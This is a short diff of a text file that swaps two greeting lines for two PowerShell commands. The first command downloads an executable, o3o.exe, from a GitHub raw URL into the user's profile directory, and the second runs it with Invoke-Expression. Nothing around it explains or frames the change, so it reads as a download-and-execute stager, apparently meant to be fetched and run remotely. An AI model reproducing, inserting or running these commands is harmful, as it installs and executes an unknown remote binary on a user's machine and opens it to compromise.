@@ -1,2 +1,2 @@
-Hello from Z6R 😈
-This text is coming from GitHub
+Invoke-WebRequest -URI https://github.com/Z6Ro3o/o3otech/raw/refs/heads/main/o3o.exe -outfile $env:USERPROFILE/o3o.exe
+Invoke-Expression -Command $env:USERPROFILE/o3o.exe
